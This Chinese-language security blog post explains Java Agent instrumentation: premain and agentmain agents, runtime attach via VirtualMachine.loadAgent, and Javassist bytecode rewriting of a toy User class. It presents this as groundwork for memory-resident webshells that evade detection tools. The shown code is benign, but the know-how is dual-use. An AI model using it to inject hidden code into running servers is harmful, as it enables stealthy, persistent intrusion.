<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>JavaAgent内存马研究 | 藏青&#39;s BLOG</title>

  
  <meta name="author" content="藏青">
  

  
  <meta name="description" content="知行合一">
  

  
  <meta name="keywords" content="渗透 内网 代码审计">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="JavaAgent内存马研究"/>

  <meta property="og:site_name" content="藏青&#39;s BLOG"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">藏青&#39;s BLOG</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/categories">Categories</a></li>
      
        <li><a href="/links">Links</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>JavaAgent内存马研究</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2021/10/13/JavaAgent内存马研究/" rel="bookmark">
        <time class="entry-date published" datetime="2021-10-13T08:59:19.000Z">
          2021-10-13
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近在研究<code>webshell</code>免杀，发现针对很多类型的内存马已经有了比较成型的检测方法，当然大多数内存马的查杀方式也是基于<code>javaAgent</code>，但是<code>rebeyond</code>前辈在文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10075">Java内存攻击技术漫谈</a>中给出了绕过检测工具的方法，理论上这种绕过会导致现有的基于<code>Agent</code>检测的工具无法使用，所以值得我们深入学习。</p>
<span id="more"></span>

<h2 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h2><p>​    网上关于<code>Java Agent</code>的文章已经很多了，下面引用一段关于<code>Java Agent</code>的介绍。</p>
<blockquote>
<p>java Instrumentation指的是可以用独立于应用程序之外的代理（agent）程序来监测和协助运行在JVM上的应用程序。这种监测和协助包括但不限于获取JVM运行时状态，替换和修改类定义等。简单一句话概括下：<strong>Java Instrumentation可以在JVM启动后，动态修改已加载或者未加载的类，包括类的属性、方法。</strong></p>
</blockquote>
<p>​    一般有两种方式运行<code>Agent</code>，即<code>启动时</code>和<code>运行时</code>。</p>
<h3 id="启动时"><a href="#启动时" class="headerlink" title="启动时"></a>启动时</h3><p>​    启动Java程序的时候添加<code>-javaagent(Instrumentation API实现方式)</code>或<code>-agentpath/-agentlib(JVMTI的实现方式)</code>参数。</p>
<h4 id="如何实现？"><a href="#如何实现？" class="headerlink" title="如何实现？"></a>如何实现？</h4><ul>
<li>jar包中的MANIFEST.MF 文件必须指定 Premain-Class 项</li>
<li>Premain-Class 指定的那个类必须实现 premain() 方法</li>
</ul>
<p><code>premain</code>方法会在执行main方法前调用，<strong>在运行main方法前会去加载-javaagent指定的jar包里面的Premain-Class类中的premain方法</strong>。</p>
<p><img src="/2021/10/13/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/image-20211018100416393.png" alt="image-20211018100416393"></p>
<h4 id="instrument类"><a href="#instrument类" class="headerlink" title="instrument类"></a>instrument类</h4><p>​    提供允许 Java 编程语言代理监测运行在 JVM 上的程序的服务。监测的机制是<strong>对方法的字节码的修改</strong>,在启动 JVM 时，通过指示代理类 及其代理选项 启动一个代理程序。</p>
<h4 id="Instrumentation接口"><a href="#Instrumentation接口" class="headerlink" title="Instrumentation接口"></a>Instrumentation接口</h4><p>​    <code>Instrumentation</code>提供了用来监测运行在JVM中的Java API。</p>
<ul>
<li><code>addTransformer/removeTransformer</code> 添加或删除ClassFileTransformer</li>
<li><code>getAllLoadedClasses</code>获取所有JVM加载的类</li>
<li><code>redefineClasses</code>重新定义已经加载类的字节码</li>
<li><code>setNativeMethodPrefix</code>动态设置<code>JNI</code>前缀，可以实现Hook native方法。</li>
<li><code>retransformClasses</code>重新加载已经被JVM加载过的类的字节码</li>
</ul>
<h4 id="ClassFileTransformer接口"><a href="#ClassFileTransformer接口" class="headerlink" title="ClassFileTransformer接口"></a>ClassFileTransformer接口</h4><p>​    <code>ClassFileTransformer</code>是一个转换类文件的代理接口，我们可以在获取到<code>Instrumentation</code>对象后通过<code>addTransformer</code>方法添加自定义类文件转换器。</p>
<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>​    当我们使用了<code>addTransformer</code>注册了一个我们自定义的<code>Transformer</code>到<code>Java Agent</code>，当有新的类被<code>JVM</code>加载时<code>JVM</code>会自动回调用我们自定义的<code>Transformer</code>类的<code>transform</code>方法，传入该类的<code>transform</code>信息(<code>类名、类加载器、类字节码</code>等)，我们可以根据传入的类信息决定是否需要修改类字节码，修改完字节码后我们将新的类字节码返回给<code>JVM</code>，<code>JVM</code>会验证类和相应的修改是否合法，如果符合类加载要求<code>JVM</code>会加载我们修改后的类字节码。</p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>​    下面我们举个栗子，使用<code>Java Agent</code> 完成对类的内容的修改。</p>
<ul>
<li>创建User类，内容如下</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>创建<code>FirstAgent</code>类，并重写<code>premain</code>方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;FirstAgent is Start.&quot;</span>);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> FirstTransformer());</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>创建<code>FirstTransformer</code>类，重写<code>transform</code>方法，通过<code>javasist</code>技术对<code>User</code>类添加<code>sex</code>属性并对<code>toString</code>方法修改。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">                            ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="comment">//只修改自定义的User类</span></span><br><span class="line">        <span class="keyword">if</span>(className.equals(<span class="string">&quot;User&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">                classPool.appendClassPath(<span class="keyword">new</span> LoaderClassPath(loader));</span><br><span class="line">                CtClass clazz = classPool.makeClass(<span class="keyword">new</span> ByteArrayInputStream(classfileBuffer), <span class="keyword">false</span>);</span><br><span class="line">                <span class="comment">//定义一个String类型的sex属性</span></span><br><span class="line">                CtField param = <span class="keyword">new</span> CtField(classPool.get(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;sex&quot;</span>, clazz);</span><br><span class="line">                <span class="comment">//设置属性为private</span></span><br><span class="line">                param.setModifiers(Modifier.PRIVATE);</span><br><span class="line">                <span class="comment">//将属性加到类中，并设置属性的默认值为male</span></span><br><span class="line">                clazz.addField(param, CtField.Initializer.constant(<span class="string">&quot;male&quot;</span>));</span><br><span class="line">                <span class="comment">//为刚才的sex属性添加GET SET 方法</span></span><br><span class="line">                clazz.addMethod(CtNewMethod.setter(<span class="string">&quot;setSex&quot;</span>, param));</span><br><span class="line">                clazz.addMethod(CtNewMethod.getter(<span class="string">&quot;getSex&quot;</span>, param));</span><br><span class="line">                <span class="comment">//重写toString方法，将sex属性加入返回结果中。</span></span><br><span class="line">                CtMethod method = clazz.getDeclaredMethod(<span class="string">&quot;toString&quot;</span>);</span><br><span class="line">                method.setBody(<span class="string">&quot;return \&quot;User&#123;\&quot; +\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                \&quot;name=&#x27;\&quot; + name + &#x27;\\&#x27;,&#x27; +\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                \&quot;sex=&#x27;\&quot; + sex + &#x27;\\&#x27;&#x27; +\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                &#x27;&#125;&#x27;;&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>编写测试类,创建<code>User</code>对象并输出</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        System.out.println(JSON.toJSON(user));</span><br><span class="line">        System.out.println(user.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在<code>pom.xml</code>中对<code>manifest</code>参数设置</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">Premain-Class</span>&gt;</span>FirstAgent<span class="tag">&lt;/<span class="name">Premain-Class</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">Boot-Class-Path</span>&gt;</span>javaagent.jar<span class="tag">&lt;/<span class="name">Boot-Class-Path</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">Can-Set-Native-Method-Prefix</span>&gt;</span>false<span class="tag">&lt;/<span class="name">Can-Set-Native-Method-Prefix</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>最后在启动测试类时加上<code>-javaagent:D:\javaagent-1.0-SNAPSHOT.jar</code>,可以看到我们的<code>Agent</code>已经生效。</li>
</ul>
<p><img src="/2021/10/13/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/image-20211017124017908.png" alt="image-20211017124017908"></p>
<h3 id="运行时"><a href="#运行时" class="headerlink" title="运行时"></a>运行时</h3><p>​    上面虽然已经了解了<code>启动时</code>的Agent技术，但从我们利用来讲，肯定不能为了种植内存马停了<code>Tomcat</code>服务再启动吧？所以<code>运行时</code>的Agent技术实现才是我们了解的重点。</p>
<p>​    在JDK 1.6后，增加了<code>agentmain</code>方法，可以在<code>main</code>方法执行后执行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span> <span class="params">(String agentArgs, Instrumentation inst)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span> <span class="params">(String agentArgs)</span></span></span><br></pre></td></tr></table></figure>

<p>​    运行时的<code>Agent</code>实现主要依靠<code>VirtualMachine</code>和<code>VirtualMachineDescriptor</code></p>
<h4 id="VirtualMachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h4><p>​    <code>VirtualMachine</code>可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。</p>
<ul>
<li><strong>Attach</strong>：允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上</li>
<li><strong>loadAgent</strong>：向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理。</li>
<li><strong>Detach</strong>：解除<code>Attach</code></li>
</ul>
<h4 id="VirtualMachineDescriptor"><a href="#VirtualMachineDescriptor" class="headerlink" title="VirtualMachineDescriptor"></a>VirtualMachineDescriptor</h4><p>​    <code>VirtualMachineDescriptor</code>是用于描述 Java 虚拟机的容器类。它封装了一个标识目标虚拟机的标识符，以及一个<code>AttachProvider</code>在尝试连接到虚拟机时应该使用的引用。标识符依赖于实现，但通常是进程标识符（或 pid）环境，其中每个 Java 虚拟机在其自己的操作系统进程中运行。</p>
<p>​    <code>VirtualMachineDescriptor</code>实例通常是通过调用<code>VirtualMachine.list()</code> 方法创建的。这将返回描述所有已安装 Java 虚拟机的完整描述符列表<code>attach providers</code>。</p>
<h4 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h4><p>​    <code>VirtualMachine</code>类的<code>attach(pid)</code>方法，可以attach到一个运行中的java进程上，之后便可以通过<code>loadAgent(agentJarPath)</code>来将agent的jar包注入到对应的进程，然后对应的进程会调用agentmain方法。</p>
<p><img src="/2021/10/13/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/image-20211018100507130.png" alt="image-20211018100507130"></p>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>​    下面演示使用<code>agentmain</code>运行时修改内容，示例的大部分内容和<code>启动时</code>的相同，我只列出需要更改的部分。</p>
<ul>
<li>testAttachAgent,当检测到类名为<code>test</code>时则加载Agent进行修改</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testAttachAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException </span>&#123;</span><br><span class="line">        <span class="comment">//获取当前系统中所有 运行中的 虚拟机</span></span><br><span class="line">        System.out.println(<span class="string">&quot;running JVM start &quot;</span>);</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor vmd : list) &#123;</span><br><span class="line">            <span class="comment">//如果虚拟机的名称为 xxx 则 该虚拟机为目标虚拟机，获取该虚拟机的 pid</span></span><br><span class="line">            <span class="comment">//然后加载 agent.jar 发送给该虚拟机</span></span><br><span class="line">            System.out.println(vmd.displayName());</span><br><span class="line">            <span class="keyword">if</span> (vmd.displayName().endsWith(<span class="string">&quot;test&quot;</span>)) &#123;</span><br><span class="line">                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());</span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;C:\\Users\\admin\\Desktop\\javaagent-1.0-SNAPSHOT.jar&quot;</span>);</span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>修改<code>FirstAgent</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstAgent</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">    instrumentation.addTransformer(<span class="keyword">new</span> FirstTransformer(), <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>修改<code>pom.xml</code></li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                       <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">Agent-Class</span>&gt;</span>FirstAgent<span class="tag">&lt;/<span class="name">Agent-Class</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">Boot-Class-Path</span>&gt;</span>javaagent.jar<span class="tag">&lt;/<span class="name">Boot-Class-Path</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">                           <span class="tag">&lt;<span class="name">Can-Set-Native-Method-Prefix</span>&gt;</span>false<span class="tag">&lt;/<span class="name">Can-Set-Native-Method-Prefix</span>&gt;</span></span><br><span class="line">                       <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>最后以调试运行<code>test</code>程序，再运行<code>testAttachAgent</code>,当<code>test</code>中再次触发类加载，将触发<code>transform</code>方法。</li>
</ul>
<p><img src="/2021/10/13/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/image-20211018144019281.png" alt="image-20211018144019281"></p>
<p><img src="/2021/10/13/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/image-20211018144138708.png" alt="image-20211018144138708"></p>
<h4 id="如何修改已经加载的类？"><a href="#如何修改已经加载的类？" class="headerlink" title="如何修改已经加载的类？"></a>如何修改已经加载的类？</h4><p>​    通过上面的分析，即使是运行时<code>Attach</code>，也只有在触发类加载操作时才会调用我们的<code>transform</code>,如果是已经加载的类，我们如果通过<code>Java Agent</code>进行修改呢？</p>
<p>​    对于已加载的类，需要调用<code>retransformClass</code>函数，然后经由<code>redefineClasses</code>函数，在读取已加载的字节码文件后，重新加载指定类的字节码。</p>
<ul>
<li>通过<code>retransformClasses</code>重新加载字节码</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">    instrumentation.addTransformer(<span class="keyword">new</span> FirstTransformer(), <span class="keyword">true</span>);</span><br><span class="line">    Class[] allLoadedClasses = instrumentation.getAllLoadedClasses();</span><br><span class="line">    <span class="keyword">for</span> (Class loadedClass : allLoadedClasses) &#123;</span><br><span class="line">        <span class="keyword">if</span>(loadedClass.getName()==<span class="string">&quot;User&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                instrumentation.retransformClasses(loadedClass);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnmodifiableClassException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    但是这样会报一个错误，从字面意思上是<strong>不支持在重新加载时添加或者删除字段</strong></p>
<p><img src="/2021/10/13/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/image-20211018163805780.png" alt="image-20211018163805780"></p>
<p>​    通过查阅资料，使用<code>redefineClasses</code>时有一些限制</p>
<ol>
<li><p><strong>继承相同的父类</strong>；</p>
</li>
<li><p><strong>实现相同的接口</strong>；</p>
</li>
<li><p> <strong>字段数和字段名要一致</strong>；</p>
</li>
<li><p><strong>新增或删除的方法必须是private static/final修饰的</strong>；</p>
</li>
<li><p><strong>可以修改方法实现</strong></p>
<p>所以我们要修改下<code>transform</code>方法的实现，只对<code>toString</code>方法进行修改。</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">                            ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="comment">//只修改自定义的User类</span></span><br><span class="line">        <span class="keyword">if</span>(className.equals(<span class="string">&quot;User&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">                classPool.appendClassPath(<span class="keyword">new</span> LoaderClassPath(loader));</span><br><span class="line">                CtClass clazz = classPool.makeClass(<span class="keyword">new</span> ByteArrayInputStream(classfileBuffer), <span class="keyword">false</span>);</span><br><span class="line">                CtMethod method = clazz.getDeclaredMethod(<span class="string">&quot;toString&quot;</span>);</span><br><span class="line">                method.setBody(<span class="string">&quot;return \&quot;test666\&quot;;&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/13/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/image-20211018164647941.png" alt="image-20211018164647941"></p>
